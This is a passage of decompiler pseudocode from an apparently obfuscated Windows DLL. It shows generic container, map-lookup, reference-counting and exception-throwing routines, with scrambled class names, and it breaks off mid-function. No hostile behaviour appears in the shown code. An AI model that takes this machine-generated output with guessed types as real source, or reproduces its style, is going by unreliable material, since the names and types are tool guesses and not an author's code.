// 100744C4: using guessed type int (__thiscall *off_100744C4)(void *Block, char);

//----- (10023524) --------------------------------------------------------
void __thiscall sub_10023524(_DWORD *this)
{
  *this = &off_100744C4;
  *this = &off_100743B0;
}
// 100743B0: using guessed type int (__thiscall *off_100743B0)(void *Block, char);
// 100744C4: using guessed type int (__thiscall *off_100744C4)(void *Block, char);

//----- (10023549) --------------------------------------------------------
bool __thiscall sub_10023549(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10023560) --------------------------------------------------------
BOOL __thiscall sub_10023560(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002356A) --------------------------------------------------------
int __thiscall sub_1002356A(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100235A5) --------------------------------------------------------
int __thiscall sub_100235A5(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100235DB) --------------------------------------------------------
int __thiscall sub_100235DB(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10023603) --------------------------------------------------------
int __thiscall sub_10023603(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002363E) --------------------------------------------------------
int __thiscall sub_1002363E(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002365A) --------------------------------------------------------
_DWORD *__thiscall sub_1002365A(_DWORD *Block, char a2)
{
  sub_100236D7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002367A) --------------------------------------------------------
int *__thiscall sub_1002367A(int *Block, char a2)
{
  sub_10023351(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10023699) --------------------------------------------------------
_DWORD *__thiscall sub_10023699(_DWORD *Block, char a2)
{
  sub_100233BA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100236B8) --------------------------------------------------------
_DWORD *__thiscall sub_100236B8(_DWORD *Block, char a2)
{
  sub_10023524(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100236D7) --------------------------------------------------------
void __stdcall sub_100236D7(_DWORD *a1)
{
  sub_10023351(a1 + 2);
  *a1 = &off_10074390;
}
// 10074390: using guessed type int (__thiscall *off_10074390)(void *Block, char);

//----- (10023728) --------------------------------------------------------
_DWORD *__stdcall sub_10023728(_DWORD *a1)
{
  *a1 = off_1007438C;
  sub_10009D2C(a1 + 1, (wchar_t *)&word_10072FBC);
  sub_100027A6(a1 + 3);
  return a1;
}
// 1007438C: using guessed type int (__thiscall *off_1007438C[2])(void *Block, char);

//----- (10023799) --------------------------------------------------------
_DWORD *__usercall sub_10023799@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10002C0B((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100237C9) --------------------------------------------------------
int *__thiscall sub_100237C9(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10002AFD(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1002380E) --------------------------------------------------------
void __thiscall sub_1002380E(_DWORD *this)
{
  char *v2; // eax

  *this = &off_100743D0;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10002AFD(v2);
  this[3] = 0;
  sub_10022ECD(this);
}
// 100743D0: using guessed type int (__thiscall *off_100743D0)(void *Block, char);

//----- (10023860) --------------------------------------------------------
int __thiscall sub_10023860(_DWORD *this)
{
  return this[1];
}

//----- (10023864) --------------------------------------------------------
_DWORD *__thiscall sub_10023864(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  _DWORD *result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008E3AE);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_10023799((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  result = sub_10023799((_DWORD *)(v7 + 8 * a3), a2);
  ++this[1];
  return result;
}

//----- (100238CA) --------------------------------------------------------
int __thiscall sub_100238CA(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (100238E5) --------------------------------------------------------
int __thiscall sub_100238E5(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E3AF);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_10023799((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10023799((_DWORD *)(this[3] + 8 * v4), dword_100957AC);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 100957AC: using guessed type _DWORD dword_100957AC[2];

//----- (1002393F) --------------------------------------------------------
int __thiscall sub_1002393F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E3B9);
  return this[3] + 8 * a2;
}

//----- (10023960) --------------------------------------------------------
int __thiscall sub_10023960(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008E3BA);
  return this[3] + 8 * a2;
}

//----- (10023981) --------------------------------------------------------
char *__thiscall sub_10023981(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10002AFD(v3);
  }
  return result;
}

//----- (100239AA) --------------------------------------------------------
int __thiscall sub_100239AA(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10002AFD(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (100239D1) --------------------------------------------------------
BOOL __thiscall sub_100239D1(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (100239DC) --------------------------------------------------------
int __thiscall sub_100239DC(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (**)(void))(*this + 4))(); ++i )
    sub_10023799((_DWORD *)(this[3] + 8 * i), dword_100957AC);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 100957AC: using guessed type _DWORD dword_100957AC[2];

//----- (10023A21) --------------------------------------------------------
unsigned int __thiscall sub_10023A21(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008E3BB);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10023A93) --------------------------------------------------------
unsigned int __thiscall sub_10023A93(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10023ABB) --------------------------------------------------------
unsigned int __stdcall sub_10023ABB(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (10023ACE) --------------------------------------------------------
unsigned int __thiscall sub_10023ACE(_DWORD *this, int a2, int a3, void *Block)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, void *))(*this + 80))(this, this[2], Block);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_10024180, sub_100027E6);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_10023799((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (10023B74) --------------------------------------------------------
void __thiscall sub_10023B74(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // ebx
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  int v12; // [esp+18h] [ebp-18h]
  _DWORD *v13; // [esp+1Ch] [ebp-14h]
  unsigned int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v12 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v12 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (unsigned __int64)(unsigned int)v12 >> 29 != 0 ? -1 : 8 * v12;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v12;
      `eh vector constructor iterator'(v7 + 1, 8u, v12, (void (__thiscall *)(void *))sub_10024180, sub_100027E6);
      v13 = v8;
    }
    else
    {
      v13 = 0;
    }
    v14 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v13;
      for ( i = (char *)(v11 - (char *)v13); ; i = (char *)(v11 - (char *)v13) )
      {
        sub_10023799(v9, (_DWORD *)((char *)v9 + (_DWORD)i));
        ++v14;
        v9 += 2;
        if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v13;
    if ( v11 )
      sub_10002AFD(v11);
    this[2] = v12;
  }
}

//----- (10023C7D) --------------------------------------------------------
_DWORD *__stdcall sub_10023C7D(_DWORD *a1)
{
  sub_100241A9(a1);
  *a1 = &off_10074328;
  sub_10002228(a1 + 1, 0x10u);
  sub_10024252(a1 + 5);
  return a1;
}
// 10074328: using guessed type int (__thiscall *off_10074328)(void *Block, char);

//----- (10023CC2) --------------------------------------------------------
void __thiscall sub_10023CC2(_DWORD *this)
{
  *this = &off_10074328;
  sub_1002380E(this + 5);
  sub_100022C5(this + 1);
  sub_10022C49(this);
}
// 10074328: using guessed type int (__thiscall *off_10074328)(void *Block, char);

//----- (10023D0D) --------------------------------------------------------
bool __thiscall sub_10023D0D(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  bool result; // al

  v3 = sub_10024291(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( !sub_1000A1C0(a2, v4) )
      return 1;
  }
  return result;
}

//----- (10023D4C) --------------------------------------------------------
char __thiscall sub_10023D4C(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax

  v3 = sub_10024291(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( sub_1000A1C0(a2, v4) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10023DA0) --------------------------------------------------------
int __thiscall sub_10023DA0(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[4]; // [esp+10h] [ebp-14h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  v3 = sub_10024291(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000A1C0(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = sub_100027A6(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_100027E6(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 10023DA0: using guessed type _DWORD var_14[4];

//----- (10023E18) --------------------------------------------------------
int __thiscall sub_10023E18(_DWORD *this, int pExceptionObject)
{
  int v3; // esi
  int v4; // eax

  v3 = sub_10024291(this, pExceptionObject);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3), sub_1000A1C0(pExceptionObject, v4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v3);
}

//----- (10023E72) --------------------------------------------------------
_DWORD *__thiscall sub_10023E72(_DWORD *this, _DWORD *a2)
{
  sub_100021D4(this + 1, a2);
  return a2;
}

//----- (10023EA3) --------------------------------------------------------
_DWORD *__thiscall sub_10023EA3(_DWORD *this, _DWORD *a2)
{
  sub_10024204(this + 5, a2);
  return a2;
}

//----- (10023ED4) --------------------------------------------------------
int __thiscall sub_10023ED4(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (10023EEF) --------------------------------------------------------
int __thiscall sub_10023EEF(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (10023F03) --------------------------------------------------------
int __thiscall sub_10023F03(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (10023F0B) --------------------------------------------------------
_DWORD *__thiscall sub_10023F0B(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10023F44) --------------------------------------------------------
_DWORD *__thiscall sub_10023F44(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10023F7D) --------------------------------------------------------
_DWORD *__thiscall sub_10023F7D(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10023FB6) --------------------------------------------------------
_DWORD *__thiscall sub_10023FB6(int *this, _DWORD *a2)
{
  volatile LONG *v2; // eax
  int v3; // ecx

  v2 = (volatile LONG *)this[1];
  v3 = *this;
  a2[1] = v2;
  *a2 = v3;
  InterlockedIncrement(v2);
  return a2;
}

//----- (10024003) --------------------------------------------------------
_DWORD *__userpurge sub_10024003@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10024042) --------------------------------------------------------
void __thiscall sub_10024042(void *this)
{
  sub_10024339((int)this);
}

//----- (10024073) --------------------------------------------------------
_DWORD *__userpurge sub_10024073@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100240B2) --------------------------------------------------------
void __thiscall sub_100240B2(void *this)
{
  sub_10024361((int)this);
}

//----- (100240F1) --------------------------------------------------------
_DWORD *__userpurge sub_100240F1@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10024130) --------------------------------------------------------
void __thiscall sub_10024130(void *this)
{
  sub_1002439B((int)this);
}

//----- (10024161) --------------------------------------------------------
_DWORD *__thiscall sub_10024161(_DWORD *Block, char a2)
{
  sub_1002380E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10024180) --------------------------------------------------------
void __thiscall sub_10024180(_DWORD *this)
{
  sub_100027A6(this);
}

//----- (1002418A) --------------------------------------------------------
_DWORD *__thiscall sub_1002418A(_DWORD *Block, char a2)
{
  sub_10023CC2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100241A9) --------------------------------------------------------
_DWORD *__stdcall sub_100241A9(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10074360;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074360: using guessed type int (__thiscall *off_10074360)(void *Block, char);

//----- (10024204) --------------------------------------------------------
_DWORD *__userpurge sub_10024204@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  void *v5; // [esp-4h] [ebp-20h]

  sub_100243C3(a2);
  *a2 = &off_100743D0;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10023ACE(a2, v2, v4, v5);
  return a2;
}
// 100743D0: using guessed type int (__thiscall *off_100743D0)(void *Block, char);

//----- (10024252) --------------------------------------------------------
_DWORD *__stdcall sub_10024252(_DWORD *a1)
{
  int v1; // eax

  sub_100243C3(a1);
  *a1 = &off_100743D0;
  v1 = sub_10023ABB(1u, 0x10u);
  sub_100243F8(a1, v1);
  return a1;
}
// 100743D0: using guessed type int (__thiscall *off_100743D0)(void *Block, char);

//----- (10024291) --------------------------------------------------------
int __userpurge sub_10024291@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v7; // [esp+4h] [ebp-8h]
  int v8; // [esp+8h] [ebp-4h]

  v8 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v7 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v7 )
        break;
      v3 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( !sub_1000A1C0(v3, a2) )
        break;
      v4 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( sub_1000A1A2(v4, a2) )
      {
        v7 = v2;
        v5 = v2 + v8;
      }
      else
      {
        v8 = v2;
        v5 = v7 + v2 + 1;
      }
      v2 = v5 / 2;
    }
    while ( v5 / 2 > v8 );
  }
  if ( v2 == v8 )
    return v8 + 1;
  return v2;
}

//----- (10024339) --------------------------------------------------------
void __usercall sub_10024339(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10024361) --------------------------------------------------------
void __usercall sub_10024361(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002439B) --------------------------------------------------------
void __usercall sub_1002439B(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100243C3) --------------------------------------------------------
_DWORD *__stdcall sub_100243C3(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_1007442C;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007442C: using guessed type int (__thiscall *off_1007442C)(void *Block, char);

//----- (100243F8) --------------------------------------------------------
void __usercall sub_100243F8(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(v4 + 1, 8u, a2, (void (__thiscall *)(void *))sub_10024180, sub_100027E6);
  }
  a1[3] = v2;
}

//----- (10024472) --------------------------------------------------------
_DWORD *__stdcall sub_10024472(_DWORD *a1, int a2, int a3)
{
  sub_1000C28D(0, (int)(a1 + 1), 0);
  a1[7] = a3;
  sub_10024508(a2, a1);
  return a1;
}

//----- (100244AF) --------------------------------------------------------
_DWORD *__userpurge sub_100244AF@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3)
{
  int v3; // eax

  *a2 = a3;
  sub_1000C3F3(a1, (int)(a2 + 1));
  v3 = a2[4];
  a2[7] = 0;
  a2[6] = v3;
  return a2;
}

//----- (10024508) --------------------------------------------------------
void __fastcall sub_10024508(int a1, _DWORD *a2)
{
  unsigned __int8 v4; // al
  void *v5; // eax
  int *v6; // eax
  int v7; // eax
  int *v8; // eax
  int v9; // esi
  _DWORD v10[7]; // [esp+10h] [ebp-68h] BYREF
  int v11[5]; // [esp+2Ch] [ebp-4Ch] BYREF
  int v12[4]; // [esp+40h] [ebp-38h] BYREF
  _DWORD pExceptionObject[5]; // [esp+60h] [ebp-18h] BYREF
  int v14; // [esp+74h] [ebp-4h]

  v14 = 0;
  (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)a1 + 8))(a1, a2[7], 0);
  sub_1002FB2F(v10, a1);
  LOBYTE(v14) = 1;
  sub_1002FC62(v12, (int)v10);
  LOBYTE(v14) = 2;
  v4 = sub_1002FCF5((int)v12);
  *a2 = v4;
  if ( v4 == 12 )
  {
    v5 = (void *)sub_1002FD52(v12);
    v6 = (int *)sub_1000C28D(v5, (int)v11, 0);
    LOBYTE(v14) = 3;
    sub_1000C439(v6, (int)(a2 + 1));
    LOBYTE(v14) = 2;
    sub_1000C45D(v11);
    a2[6] = a2[4];
    v7 = sub_1002FD52(v12);
    sub_1000C79D(a2 + 1, 0, v7);
  }
  else
  {
    v8 = sub_1002FE63(v12, v11, 1);
    LOBYTE(v14) = 4;
    sub_1000C439(v8, (int)(a2 + 1));
    LOBYTE(v14) = 2;
    sub_1000C45D(v11);
    a2[6] = a2[4];
  }
  v9 = v10[6];
  if ( v9 != sub_1002FD52(v12) )
  {
    sub_10024641(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
  }
  if ( *a2 == 1 )
    *a2 = 12;
  LOBYTE(v14) = 1;
  sub_1002FCB3(v12);
  LOBYTE(v14) = 0;
  sub_1002FB88(v10);
}
// 10024508: using guessed type int var_38[4];
// 10024508: using guessed type int var_4C[5];
// 10024508: using guessed type _DWORD pExceptionObject[5];

//----- (10024641) --------------------------------------------------------
_DWORD *__stdcall sub_10024641(_DWORD *a1)
{
  *a1 = &unk_100744EC;
  sub_1000DEEF(a1 + 1);
  sub_1000CB74(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_100744E4;
  return a1;
}
// 100744E4: using guessed type int (__stdcall *off_100744E4)(char);

//----- (10024691) --------------------------------------------------------
void __thiscall sub_10024691(_DWORD *this)
